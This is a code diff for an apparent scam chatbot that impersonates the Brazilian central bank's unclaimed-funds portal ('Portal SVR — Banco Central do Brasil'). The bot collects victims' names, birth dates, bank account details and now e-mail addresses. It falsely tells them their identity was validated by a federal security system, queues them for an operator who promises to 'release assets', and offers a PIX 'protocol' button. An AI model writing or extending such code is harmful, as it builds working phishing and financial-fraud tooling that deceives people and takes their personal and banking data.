@@ -272,6 +272,9 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', huma
             ],
             [
                 { text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix:${chatId}` },
+                { text: "📧 Enviar E-mail Manual", callback_data: `cmd:send_email:${chatId}` }
+            ],
+            [
                 { text: "✅ Etapa 5 (Finalizar)", callback_data: `etapa:5:${chatId}` }
             ]
         ]
@@ -899,34 +902,16 @@ async function processIncomingMessage(msg, targetChatId) {
         // Se o lead já enviou os dados e estamos aguardando o "SIM" de confirmação
         if (currentSession.awaitingConfirm) {
             if (text.toUpperCase() === 'SIM' || text.toUpperCase().includes('CORRETO') || text.toUpperCase().includes('ESTA')) {
-                // ✅ Confirmado — avançar para a fila
+                // ✅ Confirmado — avançar para Etapa 4 (E-mail)
                 currentSession.step = 4;
                 delete currentSession.awaitingConfirm;
-                currentSession.mode = 'waiting';
                 chatSessions.set(targetChatId, currentSession);
                 saveSessions();
 
-                addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
-                const queuePos = getQueuePosition(targetChatId);
-                const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;
-
-                if (currentSession.tgMsgId) {
-                    const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType);
-                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
-                }
-
-                const frenteMsg = clientesFrente > 0
-                    ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
-                    : `Sua solicitação é a próxima a ser processada.`;
-
                 await sendBotMessage(targetChatId,
-                    `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
-                    `Prezado(a) *${currentSession.name}*,\n` +
-                    `Sua identidade e vínculo bancário foram validados com êxito pelo sistema federal de segurança.\n\n` +
-                    `⌛ *STATUS ATUAL:* Aguardando Processamento\n\n` +
-                    `${frenteMsg}\n\n` +
-                    `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
-                    `_Portal SVR — Banco Central do Brasil_`);
+                    `✅ *Dados bancários confirmados!*\n\n` +
+                    `📍 *FASE 1.4 — Canal de Comunicação:* Para que o sistema envie seu *Comprovante de Liberação* e o *Termo de Quitação* após o resgate, informe seu melhor *E-mail* para contato:\n\n` +
+                    `📌 *Exemplo:* seuemail@provedor.com`);
                 return;
             } else {
                 // Se não confirmou (quer trocar), limpa o flag e deixa o fluxo seguir para ler os novos dados abaixo
@@ -984,6 +969,52 @@ async function processIncomingMessage(msg, targetChatId) {
                 `*Responda SIM para confirmar* ou informe os dados novamente para trocar.`);
         } else {
             await sendBotMessage(targetChatId, `⚠️ *Dados Bancários Inválidos*\n\nPor gentileza, informe sua Agência e Conta corretamente para vinculação do resgate.`);
+        }
+
+        // --- ETAPA 1.4: CONFIRMAÇÃO DE E-MAIL ---
+    } else if (currentSession.step === 4) {
+        const typedEmail = text.toLowerCase().trim();
+        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+        const validDomains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com', 'icloud.com', 'uol.com.br', 'bol.com.br', 'ig.com.br', 'terra.com.br', 'live.com'];
+        
+        const isFormatValid = emailRegex.test(typedEmail);
+        const domain = typedEmail.split('@')[1];
+        const isDomainValid = validDomains.includes(domain) || (domain && domain.includes('.gov.br')) || (domain && domain.includes('.edu.br'));
+
+        if (isFormatValid && isDomainValid) {
+            // ✅ E-mail aceito — avançar para a fila (Step 5)
+            currentSession.step = 5;
+            currentSession.email = typedEmail;
+            currentSession.mode = 'waiting';
+            chatSessions.set(targetChatId, currentSession);
+            saveSessions();
+
+            addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
+            const queuePos = getQueuePosition(targetChatId);
+            const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;
+
+            if (currentSession.tgMsgId) {
+                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType);
+                await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+            }
+
+            const frenteMsg = clientesFrente > 0
+                ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
+                : `Sua solicitação é a próxima a ser processada.`;
+
+            await sendBotMessage(targetChatId,
+                `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
+                `Prezado(a) *${currentSession.name}*,\n` +
+                `Seu canal de comunicação (*${typedEmail}*) foi vinculado com sucesso ao processo de resgate.\n\n` +
+                `⌛ *STATUS ATUAL:* Aguardando Processamento Final\n\n` +
+                `${frenteMsg}\n\n` +
+                `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
+                `_Portal SVR — Banco Central do Brasil_`);
+        } else {
+            await sendBotMessage(targetChatId, 
+                `⚠️ *E-mail Inválido ou Não Reconhecido*\n\n` +
+                `O endereço informado não parece ser um e-mail válido ou pertence a um provedor não homologado.\n\n` +
+                `Por gentileza, informe um e-mail válido (Ex: Gmail, Outlook, Hotmail) para receber seu comprovante.`);
         }
     }
 }
